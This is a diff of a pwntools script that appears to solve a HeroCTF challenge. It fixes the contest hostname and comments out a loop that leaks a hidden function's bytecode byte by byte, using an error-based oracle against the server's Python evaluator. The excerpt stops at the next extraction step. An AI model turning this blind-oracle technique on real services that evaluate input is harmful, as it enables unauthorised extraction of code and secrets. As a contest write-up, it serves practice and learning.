@@ -1,31 +1,31 @@
 import string
 from pwn import *
 
-p = remote(" misc.heroctf.fr", 6000)
+p = remote("misc.heroctf.fr", 6000)
 p.recvuntil(b">> ")
 
 ### Extract assembly code
-asm_code, found, index = [], True, 0
-while found:
-    for x in range(256):
-        found = False
-        p.sendline(f"if flag.__code__.co_code[{index}]=={x}:1/0".encode())
-        res = p.recvuntil(b">> ").decode()
-        if "errors" in res:
-            # If error on opcode 0, check the next to see if the error is because we found the correct opcode
-            # or because of index error
-            if x == 0:
-                p.sendline(f"if flag.__code__.co_code[{index}]=={x+1}:1/0".encode())
-                res = p.recvuntil(b">> ").decode()
-                if "errors" in res:
-                    found = False
-                    break
-            asm_code.append(hex(x))
-            found = True
-            break
-    index += 1
+# asm_code, found, index = [], True, 0
+# while found:
+#     for x in range(256):
+#         found = False
+#         p.sendline(f"if flag.__code__.co_code[{index}]=={x}:1/0".encode())
+#         res = p.recvuntil(b">> ").decode()
+#         if "errors" in res:
+#             # If error on opcode 0, check the next to see if the error is because we found the correct opcode
+#             # or because of index error
+#             if x == 0:
+#                 p.sendline(f"if flag.__code__.co_code[{index}]=={x+1}:1/0".encode())
+#                 res = p.recvuntil(b">> ").decode()
+#                 if "errors" in res:
+#                     found = False
+#                     break
+#             asm_code.append(hex(x))
+#             found = True
+#             break
+#     index += 1
 
-print(asm_code)
+# print(asm_code)
 
 
 ### Extract assembly consts
